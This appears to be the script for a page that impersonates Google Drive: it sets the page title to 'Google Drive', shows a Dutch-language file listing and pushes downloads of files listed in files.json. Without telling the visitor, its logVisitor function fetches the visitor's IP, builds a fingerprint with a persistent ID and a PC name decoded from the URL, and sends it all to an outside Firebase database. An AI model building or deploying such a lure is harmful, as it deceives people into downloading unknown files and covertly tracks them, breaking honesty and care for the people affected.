document.addEventListener('DOMContentLoaded', () => {
    const fileListContainer = document.querySelector('.file-list');
    const viewButtons = document.querySelectorAll('.view-btn');

    // Person icon SVG (remains inline as it's a UI element, not a file icon)
    const personIcon = '<svg width="12" height="12" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>';

    // Visitor Logging to Firebase
    const logVisitor = async (pcNameFromUrl = '') => {
        try {
            // 1. Get or generate a unique ID for this browser/PC
            let visitorUid = localStorage.getItem('visitor_uid');
            if (!visitorUid) {
                visitorUid = 'uid-' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
                localStorage.setItem('visitor_uid', visitorUid);
            }

            // 2. Get IP address
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (!ipResponse.ok) throw new Error('Could not fetch IP');
            const { ip } = await ipResponse.json();
            const trimmedIp = ip.trim();

            // 3. Check if this specific UID + IP combo already exists in Firebase
            const existingResponse = await fetch('https://vss-7-d595d-default-rtdb.europe-west1.firebasedatabase.app/visitors.json');
            const existingData = await existingResponse.json();

            if (existingData) {
                const alreadyExists = Object.values(existingData).some(entry => 
                    entry && entry.ip === trimmedIp && entry.uid === visitorUid
                );
                
                if (alreadyExists) {
                    console.log('This PC/Browser has already been logged, skipping.');
                    return;
                }
            }

            // 4. Prepare log data with a more descriptive fingerprint
            const deviceLabel = `${navigator.platform} | ${window.screen.width}x${window.screen.height} | ${navigator.language}`;
            
            const logData = {
                uid: visitorUid,
                name: pcNameFromUrl || 'Onbekend',
                device: deviceLabel,
                ip: trimmedIp,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            // 4. Send to Firebase
            const postResponse = await fetch('https://vss-7-d595d-default-rtdb.europe-west1.firebasedatabase.app/visitors.json', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(logData)
            });

            if (postResponse.ok) {
                console.log('New visitor logged successfully.');
            }
        } catch (error) {
            console.error('Visitor logging failed:', error);
        }
    };


    // Load data from JSON
    fetch('files.json')
        .then(response => response.json())
        .then(data => {
            // Parse URL parameters (e.g., ?folderB64?nameB64)
            const params = window.location.search.substring(1).split('?');
            
            // 1. Decode Folder Name
            let decodedFolder = '';
            try {
                decodedFolder = atob(params[0] || '').toLowerCase();
            } catch (e) {
                console.warn('Invalid folder base64');
            }

            // 2. Decode PC Name (if provided)
            let pcNameFromUrl = '';
            if (params[1]) {
                try {
                    pcNameFromUrl = atob(params[1]);
                } catch (e) {
                    console.warn('Invalid PC name base64');
                }
            }
            
            // Find the matching folder in the array, or default to the first one
            let selectedFolder = data.find(folder => folder['folder-name'].toLowerCase() === decodedFolder);
            
            if (!selectedFolder && data.length > 0) {
                selectedFolder = data[0]; // Fallback to first folder
            }

            if (selectedFolder) {
                // Update folder title
                const titleElement = document.querySelector('.folder-title');
                if (titleElement) {
                    titleElement.textContent = selectedFolder['folder-name'];
                    document.title = 'Google Drive';
                }
                
                const currentFiles = selectedFolder.files || [];
                renderFiles(currentFiles);

                // Run visitor logging with the name from the URL
                logVisitor(pcNameFromUrl);

                // "Alles downloaden" button
                const downloadAllLink = document.querySelector('.download-link');
                if (downloadAllLink) {
                    downloadAllLink.addEventListener('click', (e) => {
                        e.preventDefault();
                        currentFiles.forEach((file, index) => {
                            setTimeout(() => {
                                const link = document.createElement('a');
                                link.href = file['file-path'];
                                link.download = '';
                                document.body.appendChild(link);
                                link.click();
                                document.body.removeChild(link);
                            }, index * 300); // Small delay between each download
                        });
                    });
                }
            }
        })
        .catch(error => console.error('Error loading files:', error));

    function renderFiles(files) {
        // Clear existing rows except header
        const header = fileListContainer.querySelector('.list-header');
        fileListContainer.innerHTML = '';
        fileListContainer.appendChild(header);

        files.forEach(file => {
            const row = document.createElement('div');
            row.className = 'file-row';
            
            row.innerHTML = `
                <div class="file-name-cell">
                    <div class="icon">
                        <img src="${file['icon-path']}" alt="icon" width="24" height="24">
                    </div>
                    <span>${file['file-name']}</span>
                </div>
                <div class="owner-cell">
                    <div class="owner-icon">
                        ${personIcon}
                    </div>
                    <span>${file.owner}</span>
                </div>
                <div class="date-cell">${file.date}</div>
                <div class="size-cell">${file.filesize}</div>
                <div class="download-cell">
                    <button class="action-btn download-btn" title="Download">
                        <svg width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
                    </button>
                </div>
            `;

            // Real Download Logic
            const downloadBtn = row.querySelector('.download-btn');
            downloadBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                
                // Create a temporary link element to trigger download
                const link = document.createElement('a');
                link.href = file['file-path'];
                link.download = ''; // Force download but use the original filename from the path
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                console.log(`Downloading: ${file['file-name']} from ${file['file-path']}`);
            });

            // Add row selection logic
            row.addEventListener('click', () => {
                console.log(`Selected file: ${file['file-name']}`);
                row.style.backgroundColor = '#e8f0fe';
                setTimeout(() => {
                    row.style.backgroundColor = '';
                }, 200);
            });

            fileListContainer.appendChild(row);
        });
    }

    // View button toggle
    viewButtons.forEach((btn, index) => {
        btn.addEventListener('click', () => {
            viewButtons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            
            if (index === 1) { // Grid view button
                fileListContainer.classList.add('grid-view');
            } else { // List view button
                fileListContainer.classList.remove('grid-view');
            }
        });
    });

    // Sort Simulation
    const headerCols = document.querySelectorAll('.header-col');
    headerCols.forEach(col => {
        col.addEventListener('click', () => {
            console.log(`Sorting by: ${col.textContent.trim()}`);
        });
    });
});
